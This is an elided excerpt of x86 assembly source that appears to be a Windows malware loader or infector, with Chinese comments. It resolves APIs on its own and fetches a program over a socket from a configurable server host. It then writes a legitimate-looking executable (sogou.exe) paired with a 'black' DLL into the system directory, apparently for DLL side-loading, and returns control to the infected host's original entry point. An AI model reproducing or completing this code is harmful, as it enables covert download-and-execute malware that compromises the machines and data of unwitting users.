...
_ProtoGetSystemDirectoryA	typedef proto	:dword,:dword


_ApiGetSystemDirectoryA typedef ptr _ProtoGetSystemDirectoryA
...
MAX_RECVBUFFER_SIZE	EQU 400000h
...
szLoadProgramCmd				db	'LOADPROGRAM:down20190722',0
szShellExecuteAOpen				db 	'open',0
szShellExecuteAParam 			db 	'STARTFIRSTTIME',0
szsogouexefn					db  'sogou.exe',0
...
; 重定位并获取一些 API 的入口地址
;********************************************************************
		local szUserName[64]:byte
		local szExePath[256]:byte
		local szDllPath[256]:byte
		local szWhiteExeName[64]:byte
		local szBlackDllName[64]:byte
		local szSysDir[64]:byte
		local lpProgramBuf		
		local dwRecvLen		
		local socketServer		
		local iCount				
		...
		local _GetSystemDirectoryA:				_ApiGetSystemDirectoryA 
...
;********************************************************************
		...
		lea	eax,[ebx+szGetSystemDirectoryA]
		invoke	_GetApi,hDllKernel32,eax
...
;********************************************************************			
		...
		;lea	ecx,szUserName
		;lea	eax,szUserName
		;invoke	_MessageBoxA,NULL,ecx,eax,MB_YESNO or MB_ICONQUESTION
		...
		push sizeof szSysDir 
		lea eax, szSysDir
		push eax
		call _GetSystemDirectoryA
		mov al,byte ptr[szSysDir]
		mov byte ptr [szExePath],al
		...
		lea eax,szDllPath
		invoke _CreateFileA,eax,GENERIC_WRITE or GENERIC_READ,0,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0
...
ifdef SERVER_HOST_IP
		...
		invoke _VirtualAlloc,0,iCount,MEM_COMMIT or MEM_RESERVE,PAGE_READWRITE
		.if eax == 0
			invoke _closesocket,socketServer
			jmp	_JmpOldEntry
		.endif
...
_DecryptWhiteExe:
		...
		lea edi,szExePath
		invoke _CreateFileA,edi,GENERIC_WRITE or GENERIC_READ,0,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0
		.if eax == INVALID_HANDLE_VALUE
			jmp _FreeBufAndJumpOld
		.endif
		mov edx,eax
